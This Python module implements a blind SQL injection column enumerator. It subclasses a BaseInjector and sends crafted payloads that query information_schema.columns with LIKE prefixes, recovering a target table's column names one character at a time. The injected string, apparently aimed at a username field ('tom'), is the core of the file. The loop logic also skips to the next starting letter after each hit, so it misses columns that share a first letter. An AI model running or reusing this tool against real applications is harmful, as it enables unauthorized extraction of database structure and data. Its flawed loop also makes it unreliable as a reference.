from typing import List
from .base_injector import BaseInjector
from .config import Config

class ColumnEnumerator(BaseInjector):
    def __init__(self, config: Config):
        super().__init__(config)
        
    def enumerate_columns(self, table_name: str) -> List[str]:
        """Enumerate all column names for a specific table."""
        columns = []
        current_index = 0
        
        while current_index < len(self.alphabet):
            def check_column_prefix(prefix: str) -> bool:
                payload = f"tom' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = '{table_name}' AND column_name LIKE '{prefix}%') > 0 -- "
                return self._make_request(payload)
                
            # Try to find a column starting with the current letter
            column_name = None
            for char in self.alphabet[current_index:]:
                if check_column_prefix(char):
                    # Found a column starting with this character, now get the full name
                    column_name = self._enumerate_string(check_column_prefix, prefix=char)
                    if column_name:
                        columns.append(column_name)
                        print(f"Found column: {column_name}")
                        current_index = self.alphabet.index(column_name[0]) + 1
                        break
                        
            if not column_name:
                # No more columns found starting with remaining letters
                break
                
        return columns
